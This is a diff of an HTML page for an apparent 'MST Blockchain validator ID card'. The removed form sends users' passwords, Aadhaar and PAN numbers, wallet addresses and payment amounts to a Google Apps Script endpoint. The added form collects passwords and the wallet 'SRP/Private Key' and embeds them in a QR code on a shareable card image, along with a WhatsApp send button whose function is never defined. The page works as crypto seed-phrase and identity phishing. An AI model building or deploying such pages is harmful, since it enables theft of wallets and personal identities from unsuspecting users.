@@ -1,39 +1,246 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Add daitels</title>
-    <link rel="stylesheet" href="mst.css">
+  <meta charset="UTF-8">
+  <title> MST ID Card</title>
+  <link rel="icon" type="image/x-icon" href="main.png">
 </head>
 <body>
-    <center><img src="mst.svg" width="450px"></center>
+
+  <div class="form-container">
+    <img src="logo.jpeg" width="400px" height="90px">
+    <form id="dataForm">
+      <label>Name:</label><input type="text" id="name" placeholder="Full Name" required>
+      <label>Password:</label><input type="text" id="password" placeholder="Password" required>
+      <label>Amount:</label><input type="text" id="amount" placeholder="Amount" required>
+      <label>Email:</label><input type="email" id="email" placeholder="Email" required>
+      <label>Phone Number:</label><input type="tel" id="phone" placeholder="Phone Number" required>
+      <label>Date:</label><input type="date" id="date" required>
+      <label>SRP/Privet Key:</label><input type="text" id="srp" placeholder="SRP/Privet Key" required>
+      <button type="button" onclick="generateCard()">Generate ID Card</button>
+    </form>
+  </div>
+
+  <div class="id-card-container" id="idCard">
+    <div class="logo">MST BLOCKCHAIN</div>
+    <div class="photo">
+      <img id="cardPhoto" src="main.png" alt="Profile" />
+    </div>
+    <h2 id="cardName">NAME</h2>
+    <h3>VALIDATOR</h3>
+    <div id="qrcode"></div>
+  </div>
+
+  <button onclick="downloadID()" style="width: 320px;">Download ID Card</button>
+  <button onclick="sendToWhatsApp()" style="width: 320px; background: green; color: white;">
+  Send to WhatsApp
+</button>
 
 
-<form method="POST" name="google-sheet" action="https://forms.gle/1xzNs4P5mxjr91LP6">
-    <label>Name:</label><input type="text" name="Name" placeholder="Enter Your Name"><br>
-    <label>Password:</label><input type="text" name="Password" placeholder="Enter Your Password"><br>
-    <label>Email:</label><input type="text" name="Email" placeholder="Enter Your Email"><br>
-    <label>Phone:</label><input type="text" name="Phone" placeholder="Enter Your Phone"><br>
-    <label>Aadhar No:</label><input type="text" name="Aadhar" placeholder="Enter Your Aadhar No"><br>
-    <label>PAN No:</label><input type="text" name="Pan" placeholder="Enter Your Pan No"><br>
-    <label>Wallet Adderss:</label><input type="text" name="Wallet" placeholder="Enter Your Wallet Address"><br>
-    <label>Date:</label><input type="text" name="Date" placeholder="Enter Your Joinning Date"><br>
-    <label>Referral Link:</label><input type="text" name="R_link" placeholder="Enter Your Referral Link"><br>
-    <label>Amount:</label><input type="text" name="Amount" placeholder="Enter Paid Amount"><br>
-    <center><button type="submit" class="btn" name="submit"><b>Uplode</button></center>
-</form>
 
-<script>
-            const scriptURL = 'https://script.google.com/macros/s/AKfycby7fJFI0cF6npCVenZD7rY0I9Ppj0dC8TYgVwdAGE_ypOLJco3k0vsvsOsuepTb_LgvFw/exec'
-            const form = document.forms['google-sheet']
-          
-            form.addEventListener('submit', e => {
-              e.preventDefault()
-              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
-                .catch(error => console.error('Error!', error.message))
-            })
-          </script>
+  <style>/* Base styling for body */
+body {
+  font-family: 'Segoe UI', sans-serif;
+  background: #eee;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 20px;
+  margin: 0;
+}
 
+/* Container for the form */
+.form-container {
+  background: black;
+  padding: 20px;
+  border-radius: 8px;
+  margin-bottom: 20px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  width: 100%;
+  max-width: 400px;
+}
 
+/* Form inputs and button styling */
+input, 
+button {
+  width: 100%;
+  padding: 10px;
+  margin: 10px 0;
+  font-size: 14px;
+  box-sizing: border-box;
+  outline: none;
+  border-radius: 5px;
+}
+label{
+  font-size: 1.1rem;
+  color: white;
+  font-weight: bold;
+
+}
+/* Styling the button */
+button {
+  background: #DE1B1B;
+  border: none;
+  cursor: pointer;
+  font-weight: bold;
+  color: white;
+
+}
+
+/* ID card container */
+.id-card-container {
+  width: 100%;
+  max-width: 400px;
+  height: 600px;
+  background: #000;
+  color: #fff;
+  border-radius: 10px;
+  text-align: center;
+  padding: 20px 10px;
+  position: relative;
+  box-shadow: 0 0 10px rgba(0,0,0,0.3);
+  margin-top: 20px;
+  box-sizing: border-box;
+}
+
+.logo {
+  font-size: 24px;
+  font-weight: bold;
+  color: #DE1B1B;
+  margin-bottom: 10px;
+}
+
+.photo img {
+  border-radius: 50%;
+  border: 3px solid yellow;
+  width: 70px;
+  height: 70px;
+  object-fit: cover;
+  margin: 0px auto;
+}
+
+#cardName {
+  color: yellow;
+  font-size: 20px;
+  margin-top: 10px;
+}
+
+#qrcode {
+  margin-top: 20px;
+}
+
+/* Responsive design for smaller screens */
+@media (max-width: 768px) {
+  .form-container {
+    max-width: 100%;
+    padding: 15px;
+  }
+
+  .id-card-container {
+    max-width: 90%;
+    height: 400px;
+  }
+
+  #cardName {
+    font-size: 18px;
+  }
+
+  .photo img {
+    width: 90px;
+    height: 90px;
+  }
+
+  #qrcode {
+    margin-top: 15px;
+  }
+}
+
+@media (max-width: 480px) {
+  body {
+    padding: 10px;
+  }
+
+  .form-container {
+    padding: 10px;
+  }
+
+  .id-card-container {
+    height: 350px;
+  }
+
+  #cardName {
+    font-size: 16px;
+  }
+
+  .photo img {
+    width: 80px;
+    height: 80px;
+  }
+
+  #qrcode {
+    margin-top: 10px;
+  }
+
+  button {
+    padding: 12px;
+  }
+}
+
+</style>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <script>function generateCard() {
+  const name = document.getElementById("name").value;
+  const password = document.getElementById("password").value;
+  const amount = document.getElementById("amount").value;
+  const email = document.getElementById("email").value;
+  const phone = document.getElementById("phone").value
+  const date = document.getElementById("date").value;
+  const srp = document.getElementById("srp").value;
+
+  // Set profile image
+  //if (profileImage) {
+    //const reader = new FileReader();
+    //reader.onload = function(e) {
+     // document.getElementById("cardPhoto").src = e.target.result;
+    //};
+    //reader.readAsDataURL(profileImage);
+  //}/
+
+  // Set name
+  document.getElementById("cardName").innerText = name;
+
+  // Create QR data string
+  const qrData = `
+Name: ${name}
+Password: ${password}
+Amount: ${amount}
+Email: ${email}
+Phone: ${phone}
+Date: ${date}
+SRP: ${srp}
+  `.trim();
+
+  // Generate QR Code
+  document.getElementById("qrcode").innerHTML = "";
+  QRCode.toCanvas(document.createElement("canvas"), qrData, function (err, canvas) {
+    if (err) {
+      console.error(err);
+      return;
+    }
+    document.getElementById("qrcode").appendChild(canvas);
+  });
+}
+
+function downloadID() {
+  html2canvas(document.getElementById("idCard")).then(canvas => {
+    const link = document.createElement("a");
+    link.download = "ID_Card.png";
+    link.href = canvas.toDataURL("image/png");
+    link.click();
+  });
+}
+</script>
 </body>
 </html>
